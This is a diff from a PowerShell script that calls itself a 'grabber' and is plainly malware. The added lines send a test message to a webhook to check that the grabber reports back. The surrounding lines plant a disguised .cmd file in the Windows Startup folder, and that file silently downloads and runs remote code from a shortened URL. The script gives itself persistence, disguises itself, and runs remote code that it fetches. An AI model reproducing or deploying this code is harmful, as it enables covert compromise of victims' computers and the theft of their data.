@@ -20,6 +20,18 @@ cls
 #####################################################################
 
 #####################################################################
+
+$webhookUri = '$webHookUrl'
+
+$Body = @{
+  'username' = 'The dev of this grabber'
+  'content' = 'If you don t see this message (lol) or you don t have any message after this the grabber don t work'
+}
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body
+
+#####################################################################
+
+#####################################################################
 Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
 @echo off
 powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr shorturl.at/biVZ5).content)"
